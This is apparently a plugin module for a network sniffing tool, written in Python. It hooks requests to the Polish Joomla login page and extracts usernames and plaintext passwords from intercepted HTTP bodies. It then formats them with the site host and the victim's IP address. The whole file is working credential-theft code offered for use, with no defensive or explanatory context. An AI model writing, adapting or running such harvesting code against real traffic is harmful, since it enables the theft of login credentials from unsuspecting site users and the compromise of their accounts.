# Polish Joomla!
L_HOOKS = dict()
L_HOOKS['url'] = 'index.php/logowanie'
L_HOOKS['module'] = 'joomlapl.parsePolishJoomla'

def parsePolishJoomla(Headers, ipsrc='', hook=''):
    import re
    User = re.findall("(?i)username=([A-Za-z0-9_-]+)&(.*)", Headers['body'])
    Passwd = re.findall("(?i)passwd=([A-Za-z0-9_-]+)&(.*)", Headers['body'])

    if len(User) > 0 and len(Passwd) > 0:
       if len(User[0]) > 0 and len(Passwd[0]) > 0:
           return "[JOOMLA]: site="+str(Headers['headers']['host'][0])+", user="+str(User[0][0])+", passwd="+Passwd[0][0]+", ip="+str(ipsrc)
